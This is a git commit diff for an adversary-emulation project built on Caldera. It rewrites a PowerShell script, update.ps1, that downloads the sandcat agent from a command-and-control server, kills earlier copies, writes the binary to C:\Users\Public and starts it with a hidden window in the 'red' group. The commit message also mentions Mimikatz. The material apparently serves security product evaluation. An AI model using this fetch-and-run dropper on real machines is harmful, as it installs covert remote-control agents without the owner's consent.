9d863be75b8c990a6719bcc86e530da996391a2b
Andrew Williams <36489577+recvfrom@users.noreply.github.com>
2020-04-19 11:37:06 -0700

    More updates to get evals_caldera working with Caldera 2.6.6
     - Use a newer version of Mimikatz to address 'Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."'
     - Updates related to using the newer version of sandcat
     - Rename the 'facts' folder to 'source' so they get picked up automaticall

--- payloads/update.ps1
+++ payloads/update.ps1
@@ -3,29 +3,15 @@ function update
     Param(
         [Parameter(Mandatory=$true)][String]$server
     )
-    $OldPids = Gwmi Win32_Process -Filter "Name='sandcat.exe'" | Select -Property ParentProcessId,ProcessId
-    if ($OldPids)
-    {
-        echo "[*] sandcat.exe is running"
-        ForEach-Object -InputObject $OldPids -Process { try { Stop-Process $_.ProcessId; Stop-Process $_.ParentProcessId } catch { "[!] could not kill sandcat.exe" }}
-    }
-    else
-    {
-        echo "[!] sandcat.exe is not running"
-    }
-    $SandcatPath = "C:\Users\Public\sandcat.exe"
-    while($true)
-    {
-        if(!(Test-Path $SandcatPath))
-        {
-            $url="$server/file/download"
-            $wc=New-Object System.Net.WebClient
-            $wc.Headers.add("file","sandcat.go")
-            $wc.Headers.add("platform","windows")
-            $output="C:\Users\Public\sandcat.exe"
-            $wc.DownloadFile($url,$output)
-        }
-        C:\Users\Public\sandcat.exe -server $server -group diy_eval
-        sleep -Seconds 60
-    }
+
+    $url="$server/file/download";
+    $wc=New-Object System.Net.WebClient;
+    $wc.Headers.add("platform","windows");
+    $wc.Headers.add("file","sandcat.go");
+    $data=$wc.DownloadData($url);
+    $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+    get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
+    rm -force "C:\Users\Public\$name.exe" -ea ignore;
+    [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
+    Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 }
